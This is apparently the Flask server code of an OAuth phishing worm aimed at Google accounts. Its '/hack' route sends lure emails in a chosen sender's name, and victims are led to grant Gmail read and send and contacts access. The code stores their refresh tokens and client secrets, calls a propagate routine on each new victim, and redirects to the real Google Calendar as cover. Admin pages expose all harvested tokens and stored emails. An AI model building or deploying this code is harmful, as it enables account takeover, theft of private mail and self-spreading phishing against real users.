from app import *
import database
import google_api
import models
import sendemail
import propagate
import base64

SCOPES = ['https://www.googleapis.com/auth/gmail.readonly', 
          'https://www.googleapis.com/auth/contacts.readonly',
          'https://www.googleapis.com/auth/gmail.send',
          'https://www.googleapis.com/auth/userinfo.profile',
          'https://www.googleapis.com/auth/userinfo.email']

CLIENT_SECRET_FILE = 'client_secret.json'

@app.route('/')
def homepage():
    return render_template('index.html')

@app.route('/hack', methods=['GET', 'POST'])
def hack_form():
    if request.method == 'POST':
        #extract post parameters
        sender_email = request.form.get('sender_email')
        sender_name = request.form.get('sender_name')
        recipient_email = request.form.get('recipient_email')

        #add recipient to db if they don't exist
        #database.update_user(email=sender_email, name=sender_name)
        database.update_user(email=recipient_email)
        
        return send_initial_email(sender_name, sender_email, recipient_email)
    else:
        return render_template('hack_form.html')

@app.route('/reset_db')
def reset_db():
    database.reset_database()
    return 'Database reset'

@app.route('/calendar')
def calendar():
    return flask.redirect(flask.url_for('authorize_user'))

@app.route('/failure')
def failure():
    return flask.redirect('https://calendar.google.com/calendar/r')

@app.route('/authorize_initial')
def authorize_initial():
    return authorize('oauth2callback_initial')

@app.route('/authorize_user')
def authorize_user():
    return authorize('oauth2callback_user')
    
@app.route('/oauth2callback_initial')
def oauth2callback_initial():
    return oauth2callback('oauth2callback_initial', 'success_initial')

@app.route('/oauth2callback_user')
def oauth2callback_user():
    return oauth2callback('oauth2callback_user', 'success_user')

@app.route('/success_initial')
def success_initial():
    sender_name = flask.session['sender_name']
    sender_email = flask.session['sender_email']
    recipient_email = flask.session['recipient_email']
    return send_initial_email(sender_name, sender_email, recipient_email)

@app.route('/success_user')
def success_user():
    user_email = flask.session['authenticated_email']
    user = database.query_user(email=user_email)
    credentials = google.oauth2.credentials.Credentials(**user_to_credentials(user))
    propagate.propagate(credentials)
    return flask.redirect('https://calendar.google.com/calendar/r')

@app.route('/user_viewer')
def user_viewer():
    users = database.query_all_users()
    user_list = []
    for user in users:
        user_list.append({'name': user.name, 'email': user.email, 'token': user.token, 'id': user.id})

    return render_template('user_viewer.html', users=user_list)

@app.route('/email_viewer')
def email_viewer():
    uid = request.args.get('user', '')
    user = database.query_user(id=uid)
    emails = database.query_email(user_id=uid)
    email_list = []
    for email in emails:
        email_dict = models.object_as_dict(email)
        email_list.append(email_dict)
    #print email_list

    return render_template('email_viewer.html', emails=email_list, username=user.name)

### HELPER FUNCTIONS ###

def send_initial_email(sender_name, sender_email, recipient_email):
    return sendemail.send_email_local(sender_name, sender_email, recipient_email)
    '''user = database.query_user(email=flask.session.get('authenticated_email'))
    if user is None or user.token is None:
        flask.session['sender_name'] = sender_name
        flask.session['sender_email'] = sender_email
        flask.session['recipient_email'] = recipient_email

        return flask.redirect(flask.url_for('authorize_initial'))
    else:
        credentials = google.oauth2.credentials.Credentials(**user_to_credentials(user))
        gmail = googleapiclient.discovery.build(
            'gmail', 'v1', credentials=credentials)
        return sendemail.send_email(sender_name, sender_email, recipient_email, gmail);'''
        
#extract credentials dict from user in db
def user_to_credentials(user):
    return {'token': user.token,
            'refresh_token': user.refresh_token,
            'token_uri': user.token_uri,
            'client_id': user.client_id,
            'client_secret': user.client_secret,
            'scopes': user.scopes.split(' ')}

#convert credentials object into dict
def credentials_to_dict(credentials):
    return {'token': credentials.token,
            'refresh_token': credentials.refresh_token,
            'token_uri': credentials.token_uri,
            'client_id': credentials.client_id,
            'client_secret': credentials.client_secret,
            'scopes': credentials.scopes}

#store credentials in db
def store_credentials(credentials):
    user_info = google_api.get_user_info(credentials)
    user_email = user_info['email']
    flask.session['authenticated_email'] = user_email
    credentials_dict = credentials_to_dict(credentials)
    database.update_user(email=user_email, credentials=credentials_dict)
    print('credentials obtained for %s' % user_email)

def authorize(redirect_url):

    # Create flow instance to manage the OAuth 2.0 Authorization Grant Flow steps.
    flow = google_auth_oauthlib.flow.Flow.from_client_secrets_file(
        CLIENT_SECRET_FILE, scopes=SCOPES)

    flow.redirect_uri = flask.url_for(redirect_url, _external=True, _scheme=app.config['PROTOCOL'])

    authorization_url, state = flow.authorization_url(
        # Enable offline access so that you can refresh an access token without
        # re-prompting the user for permission. Recommended for web server apps.
        access_type='offline',
        # Enable incremental authorization. Recommended as a best practice.
        include_granted_scopes='true')

    # Store the state so the callback can verify the auth server response.
    flask.session['state'] = state

    return flask.redirect(authorization_url)


def oauth2callback(redirect_url, success_url):
    # Specify the state when creating the flow in the callback so that it can
    # verified in the authorization server response.
    state = flask.session['state']

    flow = google_auth_oauthlib.flow.Flow.from_client_secrets_file(
        CLIENT_SECRET_FILE, scopes=SCOPES, state=state)
    flow.redirect_uri = flask.url_for(redirect_url, _external=True, _scheme=app.config['PROTOCOL'])

    # Use the authorization server's response to fetch the OAuth 2.0 tokens.
    authorization_response = flask.request.url
    flow.fetch_token(authorization_response=authorization_response)

    # Store credentials in the session.
    # ACTION ITEM: In a production app, you likely want to save these
    #              credentials in a persistent database instead.
    credentials = flow.credentials
    if credentials.refresh_token is None:
        return flask.redirect(flask.url_for('failure'))
    store_credentials(credentials)

    return flask.redirect(flask.url_for(success_url))


if __name__ == '__main__':
    # When running locally, disable OAuthlib's HTTPs verification.
    # ACTION ITEM for developers:
    #     When running in production *do not* leave this option enabled.
    os.environ['OAUTHLIB_INSECURE_TRANSPORT'] = '1'

    # Specify a hostname and port that are set as a valid redirect URI
    # for your API project in the Google API Console.
    app.run(debug=True, threaded=True)
